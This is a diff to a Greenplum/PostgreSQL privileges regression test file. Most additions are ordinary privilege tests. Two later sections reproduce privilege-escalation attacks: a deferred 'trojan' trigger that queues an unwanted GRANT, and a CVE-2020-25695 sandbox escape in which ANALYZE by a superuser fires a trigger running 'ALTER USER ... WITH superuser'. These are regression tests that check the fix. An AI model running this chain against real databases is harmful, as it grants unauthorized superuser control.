@@ -6,8 +6,10 @@
 -- s/DETAIL:  Failing row contains \(.*\) = \(.*\)/DETAIL:  Failing row contains (#####)/
 -- end_matchsubs
 
-set optimizer=off;
+set optimizer_trace_fallback = on;
 set enable_nestloop=on;
+set optimizer_enable_nljoin = on;
+
 -- Clean up in case a prior regression run failed
 
 -- Suppress NOTICE messages when users/groups don't exist
@@ -102,9 +104,15 @@ GRANT ALL ON atest1 TO PUBLIC; -- fail
 SELECT * FROM atest1 WHERE ( b IN ( SELECT col1 FROM atest2 ) );
 SELECT * FROM atest2 WHERE ( col1 IN ( SELECT b FROM atest1 ) );
 
+-- test ctas
+create table atest2_ctas_ok as select col1 from atest2
+where col1 in (select distinct b from atest1); -- ok 
 
 SET SESSION AUTHORIZATION regress_priv_user3;
 SELECT session_user, current_user;
+
+create table atest2_ctas_fail as select col1 from atest2
+where col1 in (select distinct b from atest1); -- fail 
 
 SELECT * FROM atest1; -- ok
 SELECT * FROM atest2; -- fail
@@ -141,7 +149,7 @@ SELECT * FROM atest1; -- ok
 SET SESSION AUTHORIZATION regress_priv_user1;
 
 CREATE TABLE atest12 as
-  SELECT x AS a, 10001 - x AS b FROM generate_series(1,10000) x;
+  SELECT x AS a, 10001 - x AS b FROM generate_series(1,10000) x distributed by (a);
 CREATE INDEX ON atest12 (a);
 CREATE INDEX ON atest12 (abs(a));
 VACUUM ANALYZE atest12;
@@ -186,6 +194,7 @@ EXPLAIN (COSTS OFF) SELECT * FROM atest12 WHERE a >>> 0;
 -- These plans should continue to use a nestloop, since they execute with the
 -- privileges of the view owner.
 EXPLAIN (COSTS OFF) SELECT * FROM atest12v x, atest12v y WHERE x.a = y.b;
+
 EXPLAIN (COSTS OFF) SELECT * FROM atest12sbv x, atest12sbv y WHERE x.a = y.b;
 
 -- A non-security barrier view does not guard against information leakage.
@@ -224,6 +233,12 @@ SET SESSION AUTHORIZATION regress_priv_user1;
 SELECT * FROM atest3; -- fail
 DELETE FROM atest3; -- ok
 
+BEGIN;
+RESET SESSION AUTHORIZATION;
+ALTER ROLE regress_priv_user1 NOINHERIT;
+SET SESSION AUTHORIZATION regress_priv_user1;
+DELETE FROM atest3;
+ROLLBACK;
 
 -- views
 
@@ -398,6 +413,44 @@ UPDATE t1 SET c3 = 10; -- fail, but see columns with SELECT rights, or being mod
 
 SET SESSION AUTHORIZATION regress_priv_user1;
 DROP TABLE t1;
+
+-- check error reporting with column privs on a partitioned table
+CREATE TABLE errtst(a text, b text NOT NULL, c text, secret1 text, secret2 text) PARTITION BY LIST (a);
+CREATE TABLE errtst_part_1(secret2 text, c text, a text, b text NOT NULL, secret1 text) DISTRIBUTED BY (a);
+CREATE TABLE errtst_part_2(secret1 text, secret2 text, a text, c text, b text NOT NULL) DISTRIBUTED BY (a);
+
+ALTER TABLE errtst ATTACH PARTITION errtst_part_1 FOR VALUES IN ('aaa');
+ALTER TABLE errtst ATTACH PARTITION errtst_part_2 FOR VALUES IN ('aaaa');
+
+GRANT SELECT (a, b, c) ON TABLE errtst TO regress_priv_user2;
+GRANT UPDATE (a, b, c) ON TABLE errtst TO regress_priv_user2;
+GRANT INSERT (a, b, c) ON TABLE errtst TO regress_priv_user2;
+
+INSERT INTO errtst_part_1 (a, b, c, secret1, secret2)
+VALUES ('aaa', 'bbb', 'ccc', 'the body', 'is in the attic');
+
+SET SESSION AUTHORIZATION regress_priv_user2;
+
+-- Perform a few updates that violate the NOT NULL constraint. Make sure
+-- the error messages don't leak the secret fields.
+
+-- simple insert.
+INSERT INTO errtst (a, b) VALUES ('aaa', NULL);
+-- simple update.
+UPDATE errtst SET b = NULL;
+-- partitioning key is updated, doesn't move the row.
+UPDATE errtst SET a = 'aaa', b = NULL;
+-- row is moved to another partition.
+UPDATE errtst SET a = 'aaaa', b = NULL;
+
+-- row is moved to another partition. This differs from the previous case in
+-- that the new partition is excluded by constraint exclusion, so its
+-- ResultRelInfo is not created at ExecInitModifyTable, but needs to be
+-- constructed on the fly when the updated tuple is routed to it.
+UPDATE errtst SET a = 'aaaa', b = NULL WHERE a = 'aaa';
+
+SET SESSION AUTHORIZATION regress_priv_user1;
+DROP TABLE errtst;
 
 -- test column-level privileges when involved with DELETE
 SET SESSION AUTHORIZATION regress_priv_user1;
@@ -786,6 +839,104 @@ SELECT has_table_privilege('regress_priv_user3', 'atest4', 'SELECT'); -- false
 SELECT has_table_privilege('regress_priv_user1', 'atest4', 'SELECT WITH GRANT OPTION'); -- true
 
 
+-- security-restricted operations
+\c -
+CREATE ROLE regress_sro_user;
+
+-- Check that index expressions and predicates are run as the table's owner
+
+-- A dummy index function checking current_user
+CREATE FUNCTION sro_ifun(int) RETURNS int AS $$
+BEGIN
+	-- Below we set the table's owner to regress_sro_user
+	ASSERT current_user = 'regress_sro_user',
+		format('sro_ifun(%s) called by %s', $1, current_user);
+	RETURN $1;
+END;
+$$ LANGUAGE plpgsql IMMUTABLE;
+-- Create a table owned by regress_sro_user
+CREATE TABLE sro_tab (a int);
+ALTER TABLE sro_tab OWNER TO regress_sro_user;
+INSERT INTO sro_tab VALUES (1), (2), (3);
+-- Create an expression index with a predicate
+CREATE INDEX sro_idx ON sro_tab ((sro_ifun(a) + sro_ifun(0)))
+	WHERE sro_ifun(a + 10) > sro_ifun(10);
+DROP INDEX sro_idx;
+-- Do the same concurrently
+CREATE INDEX sro_idx ON sro_tab ((sro_ifun(a) + sro_ifun(0)))
+	WHERE sro_ifun(a + 10) > sro_ifun(10);
+-- REINDEX
+REINDEX TABLE sro_tab;
+REINDEX INDEX sro_idx;
+REINDEX TABLE CONCURRENTLY sro_tab;
+DROP INDEX sro_idx;
+-- CLUSTER
+CREATE INDEX sro_cluster_idx ON sro_tab ((sro_ifun(a) + sro_ifun(0)));
+CLUSTER sro_tab USING sro_cluster_idx;
+DROP INDEX sro_cluster_idx;
+-- BRIN index
+CREATE INDEX sro_brin ON sro_tab USING brin ((sro_ifun(a) + sro_ifun(0)));
+SELECT brin_desummarize_range('sro_brin', 0);
+SELECT brin_summarize_range('sro_brin', 0);
+DROP TABLE sro_tab;
+-- Check with a partitioned table
+CREATE TABLE sro_ptab (a int) PARTITION BY RANGE (a);
+ALTER TABLE sro_ptab OWNER TO regress_sro_user;
+CREATE TABLE sro_part PARTITION OF sro_ptab FOR VALUES FROM (1) TO (10);
+ALTER TABLE sro_part OWNER TO regress_sro_user;
+INSERT INTO sro_ptab VALUES (1), (2), (3);
+CREATE INDEX sro_pidx ON sro_ptab ((sro_ifun(a) + sro_ifun(0)))
+	WHERE sro_ifun(a + 10) > sro_ifun(10);
+REINDEX TABLE sro_ptab;
+REINDEX INDEX CONCURRENTLY sro_pidx;
+
+SET SESSION AUTHORIZATION regress_sro_user;
+CREATE FUNCTION unwanted_grant() RETURNS void LANGUAGE sql AS
+	'GRANT regress_priv_group2 TO regress_sro_user';
+CREATE FUNCTION mv_action() RETURNS bool LANGUAGE sql AS
+	'DECLARE c CURSOR WITH HOLD FOR SELECT unwanted_grant(); SELECT true';
+-- REFRESH of this MV will queue a GRANT at end of transaction
+CREATE MATERIALIZED VIEW sro_mv AS SELECT mv_action() WITH NO DATA;
+REFRESH MATERIALIZED VIEW sro_mv;
+\c -
+REFRESH MATERIALIZED VIEW sro_mv;
+
+SET SESSION AUTHORIZATION regress_sro_user;
+-- INSERT to this table will queue a GRANT at end of transaction
+CREATE TABLE sro_trojan_table ();
+CREATE FUNCTION sro_trojan() RETURNS trigger LANGUAGE plpgsql AS
+	'BEGIN PERFORM unwanted_grant(); RETURN NULL; END';
+CREATE CONSTRAINT TRIGGER t AFTER INSERT ON sro_trojan_table
+    INITIALLY DEFERRED FOR EACH ROW EXECUTE PROCEDURE sro_trojan();
+-- Now, REFRESH will issue such an INSERT, queueing the GRANT
+CREATE OR REPLACE FUNCTION mv_action() RETURNS bool LANGUAGE sql AS
+	'INSERT INTO sro_trojan_table DEFAULT VALUES; SELECT true';
+REFRESH MATERIALIZED VIEW sro_mv;
+\c -
+REFRESH MATERIALIZED VIEW sro_mv;
+BEGIN; SET CONSTRAINTS ALL IMMEDIATE; REFRESH MATERIALIZED VIEW sro_mv; COMMIT;
+
+-- REFRESH MATERIALIZED VIEW CONCURRENTLY use of eval_const_expressions()
+SET SESSION AUTHORIZATION regress_sro_user;
+CREATE FUNCTION unwanted_grant_nofail(int) RETURNS int
+	IMMUTABLE LANGUAGE plpgsql AS $$
+BEGIN
+	PERFORM unwanted_grant();
+	RAISE WARNING 'owned';
+	RETURN 1;
+EXCEPTION WHEN OTHERS THEN
+	RETURN 2;
+END$$;
+CREATE MATERIALIZED VIEW sro_index_mv AS SELECT 1 AS c DISTRIBUTED BY (c);
+CREATE UNIQUE INDEX ON sro_index_mv (c) WHERE unwanted_grant_nofail(1) > 0;
+\c -
+REFRESH MATERIALIZED VIEW CONCURRENTLY sro_index_mv;
+REFRESH MATERIALIZED VIEW sro_index_mv;
+
+DROP OWNED BY regress_sro_user;
+DROP ROLE regress_sro_user;
+
+
 -- Admin options
 
 SET SESSION AUTHORIZATION regress_priv_user4;
@@ -941,7 +1092,8 @@ CREATE TABLE testns.acltest1 (x int);
 SELECT has_table_privilege('regress_priv_user1', 'testns.acltest1', 'SELECT'); -- no
 SELECT has_table_privilege('regress_priv_user1', 'testns.acltest1', 'INSERT'); -- no
 
-ALTER DEFAULT PRIVILEGES IN SCHEMA testns GRANT SELECT ON TABLES TO public;
+-- placeholder for test with duplicated schema and role names
+ALTER DEFAULT PRIVILEGES IN SCHEMA testns,testns GRANT SELECT ON TABLES TO public,public;
 
 SELECT has_table_privilege('regress_priv_user1', 'testns.acltest1', 'SELECT'); -- no
 SELECT has_table_privilege('regress_priv_user1', 'testns.acltest1', 'INSERT'); -- no
@@ -1191,6 +1343,119 @@ set session role regress_priv_user1;
 drop table dep_priv_test;
 
 
+-- security-restricted operations
+\c -
+CREATE ROLE regress_sro_user;
+
+SET SESSION AUTHORIZATION regress_sro_user;
+CREATE FUNCTION unwanted_grant() RETURNS void LANGUAGE sql AS
+	'GRANT regress_priv_group2 TO regress_sro_user';
+CREATE FUNCTION mv_action() RETURNS bool LANGUAGE sql AS
+	'DECLARE c CURSOR WITH HOLD FOR SELECT unwanted_grant(); SELECT true';
+-- REFRESH of this MV will queue a GRANT at end of transaction
+CREATE MATERIALIZED VIEW sro_mv AS SELECT mv_action() WITH NO DATA;
+REFRESH MATERIALIZED VIEW sro_mv;
+\c -
+REFRESH MATERIALIZED VIEW sro_mv;
+
+SET SESSION AUTHORIZATION regress_sro_user;
+-- INSERT to this table will queue a GRANT at end of transaction
+CREATE TABLE sro_trojan_table ();
+CREATE FUNCTION sro_trojan() RETURNS trigger LANGUAGE plpgsql AS
+	'BEGIN PERFORM unwanted_grant(); RETURN NULL; END';
+CREATE CONSTRAINT TRIGGER t AFTER INSERT ON sro_trojan_table
+    INITIALLY DEFERRED FOR EACH ROW EXECUTE PROCEDURE sro_trojan();
+-- Now, REFRESH will issue such an INSERT, queueing the GRANT
+CREATE OR REPLACE FUNCTION mv_action() RETURNS bool LANGUAGE sql AS
+	'INSERT INTO sro_trojan_table DEFAULT VALUES; SELECT true';
+REFRESH MATERIALIZED VIEW sro_mv;
+\c -
+REFRESH MATERIALIZED VIEW sro_mv;
+BEGIN; SET allow_segment_DML = ON; SET CONSTRAINTS ALL IMMEDIATE; REFRESH MATERIALIZED VIEW sro_mv; COMMIT;
+
+DROP OWNED BY regress_sro_user;
+DROP ROLE regress_sro_user;
+
+
+-- Test sandbox escape with CVE-2020-25695 on Greenplum.
+--
+-- The idea of CVE-2020-25695 is to make superuser fire a defered
+-- trigger with security invoker function that executes some malicious
+-- code with superuser privileges.
+--
+-- We create a two-step trap for a superuser running a maintenance
+-- operation (ANALYZE) on a "trap" table. First of all we create
+-- an index with stable function and replace it with volatile one after
+-- creation. This index function is invoked by ANALYZE and acts as a
+-- vulnerability firestarter - it inserts data to some table aside ("executor").
+-- "Executor" table has a defered insert trigger with security invoker
+-- function that executes malicious code under superuser. In a current example
+-- we give superuser to our unprivileged user on segments (not on coordinator node).
+
+\c -
+
+CREATE ROLE regress_sro_user;
+SET SESSION AUTHORIZATION regress_sro_user;
+
+CREATE TABLE executor (s varchar) DISTRIBUTED REPLICATED;
+CREATE TABLE trap (a int) WITH(appendonly = true) DISTRIBUTED REPLICATED;
+
+-- Create a "firestarter" stable index funcion
+CREATE OR REPLACE FUNCTION trap_sfunc(integer) RETURNS integer
+LANGUAGE sql IMMUTABLE AS
+'SELECT $1';
+
+CREATE INDEX trap_idx ON trap (trap_sfunc(a));
+
+-- and replace it with volatile security invoker to prodice insert operation on ANALYZE.
+CREATE OR REPLACE FUNCTION trap_sfunc(integer) RETURNS integer
+LANGUAGE sql SECURITY INVOKER AS
+'SET allow_segment_DML = ON; INSERT INTO executor VALUES (current_user); SELECT $1';
+
+-- Populate data in a "trap" table to run ANALYZE on.
+SET allow_segment_DML = ON;
+INSERT INTO trap VALUES(1);
+
+-- Create malicious function to run in defered trigger
+CREATE OR REPLACE FUNCTION executor_sfunc(integer) RETURNS integer
+LANGUAGE sql SECURITY INVOKER AS
+'SET allow_segment_DML = ON; ALTER USER regress_sro_user WITH superuser; SELECT $1';
+
+-- and the trigger itself.
+CREATE OR REPLACE FUNCTION executor_trig_sfunc() RETURNS trigger
+AS $$
+BEGIN PERFORM executor_sfunc(1000); RETURN NEW; END
+$$ LANGUAGE plpgsql;
+
+CREATE CONSTRAINT TRIGGER executor_trig
+AFTER INSERT ON executor
+INITIALLY DEFERRED FOR EACH ROW
+EXECUTE PROCEDURE executor_trig_sfunc();
+
+-- Check "regress_sro_user" superuser privileges on segments.
+CREATE OR REPLACE FUNCTION is_superuser_on_segments(username text) RETURNS setof boolean AS $$
+SELECT rolsuper FROM pg_roles WHERE rolname = $1;
+$$ LANGUAGE sql EXECUTE ON ALL SEGMENTS;
+
+SELECT DISTINCT is_superuser_on_segments('regress_sro_user');
+
+-- Execute a trap with superuser.
+RESET SESSION AUTHORIZATION;
+
+ANALYZE trap;
+
+-- Check "regress_sro_user" superuser privileges on segments.
+SELECT DISTINCT is_superuser_on_segments('regress_sro_user');
+
+DROP TABLE trap;
+DROP TABLE executor;
+DROP FUNCTION trap_sfunc(integer);
+DROP FUNCTION executor_sfunc(integer);
+DROP FUNCTION executor_trig_sfunc();
+DROP FUNCTION is_superuser_on_segments(text);
+DROP ROLE regress_sro_user;
+
+
 -- clean up
 
 \c
@@ -1219,6 +1484,7 @@ DROP TABLE atest6;
 DROP TABLE atestc;
 DROP TABLE atestp1;
 DROP TABLE atestp2;
+DROP TABLE atest2_ctas_ok;
 
 -- start_ignore
 SELECT lo_unlink(oid) FROM pg_largeobject_metadata WHERE oid >= 1000 AND oid < 3000 ORDER BY oid;
@@ -1317,6 +1583,11 @@ LOCK TABLE lock_table IN ACCESS EXCLUSIVE MODE; -- should pass
 COMMIT;
 \c
 REVOKE TRUNCATE ON lock_table FROM regress_locktable_user;
+
+-- regression test: superuser create a schema and authorize it to a non-superuser
+DROP ROLE IF EXISTS "non_superuser_schema";
+CREATE ROLE "non_superuser_schema";
+CREATE SCHEMA test_non_superuser_schema AUTHORIZATION "non_superuser_schema";
 
 -- clean up
 DROP TABLE lock_table;
